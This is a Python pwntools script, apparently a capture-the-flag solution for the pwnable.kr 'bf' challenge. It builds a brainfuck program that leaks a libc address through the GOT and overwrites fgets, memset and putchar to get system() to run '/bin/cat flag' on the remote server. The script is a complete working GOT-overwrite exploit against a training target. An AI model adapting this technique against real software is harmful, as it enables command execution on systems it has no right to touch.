#!/usr/bin/env python

import pwn
import sys

prog = b''

def next(n=1):
    """ increment the pointer n times"""
    global prog
    prog += b'>' * n

def previous(n):
    """ decrement the pointer n times"""
    global prog
    prog = prog + b'<' * n

def out(n):
    global prog
    prog = prog + b'.>' * n
    previous(n)


def write(n):
    """ Write the byte array to the current pointer, automatically resets pointer"""
    global write_queue
    global prog
    prog = prog + b',>' * n
    previous(n)


bf = pwn.ELF('bf')
bf_libc = pwn.ELF('bf_libc.so')
#bf_libc = pwn.ELF('/usr/lib32/libc.so.6')

# Move to the lowest are
start = bf.symbols['tape']
gfgets = bf.symbols['got.fgets']
gmemset = bf.symbols['got.memset']
gputchar = bf.symbols['got.putchar']

# Progress to fgets in GOT
previous(start - gfgets)
out(4) # Leak current fgets for the math that will follow...
write(4) # Overwrite fgets -> gets

# progress to memset
next(gmemset - gfgets)
write(4) # Overwrite memset -> system

# Progress to putchar, replace with main/_start
next(gputchar - gmemset)
write(4) # Overwrite putchar -> main

# Trigger putchar() with '.'
out(1)

# Connect...
host = 'pwnable.kr'
port = 9001
conn = pwn.remote(host, port)
conn.recvline()
conn.recvline()

# Send the program
conn.sendline(prog)

# Read real fgets location
received = conn.recvn(4)
leak = int.from_bytes(received, "little")
offset_to_system = bf_libc.symbols['fgets'] - bf_libc.symbols['system']
offset_to_gets = bf_libc.symbols['fgets'] - bf_libc.symbols['gets']
write_queue = pwn.p32(leak - offset_to_system)
write_queue += pwn.p32(leak - offset_to_gets)
write_queue += pwn.p32(bf.symbols['main'])
write_queue += b'/bin/cat flag\n'

conn.send(write_queue)

# Ignore instructions
conn.recvline()
conn.recvline()

# Recover results
results = conn.recvall()
print(b'-'*20 + b' Flag ' + b'-'*20)
print(results)
print(b'-'*20 + b' Flag ' + b'-'*20)

print("fgets address leaked: {}".format(hex(leak)))
print("Program size: {} bytes".format(len(prog)))
print("Program:\n{}".format(prog))
print("Write queue:")
print(write_queue)
